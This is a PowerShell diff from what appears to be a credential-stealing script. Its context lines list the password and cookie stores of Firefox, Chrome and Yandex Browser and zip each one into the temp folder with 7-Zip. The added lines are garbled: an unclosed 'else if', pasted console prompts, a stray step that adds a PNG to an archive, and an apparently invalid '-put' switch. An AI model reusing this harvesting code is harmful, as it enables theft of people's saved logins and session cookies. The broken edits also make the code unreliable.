@@ -6,6 +6,18 @@ if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){
     Set-Location -Path "C:\Program Files\7-Zip\";
     $arh="7"
   }
+else if (Test-Path -Path "C:\Program Files\7-Zip\7z.exe"
+
+
+$Zip="C:\Users\qwe\Desktop\ARH\22.zip"
+>> #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
+>>
+>>
+>> #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
+>> $file="C:\Users\qwe\Desktop\sdsdas.png"
+>> [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
+>> [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
+>> $ZipFile.Dispose()
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
         2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
@@ -26,7 +38,7 @@ for ($i=0; $i -lt 5; $i++){
     $p=($env:TEMP+"\"+$lst[$i][1]+".zip")
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
     if($arh){
-       .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -spf -tzip
+       .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
 #      Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
        }
     else{
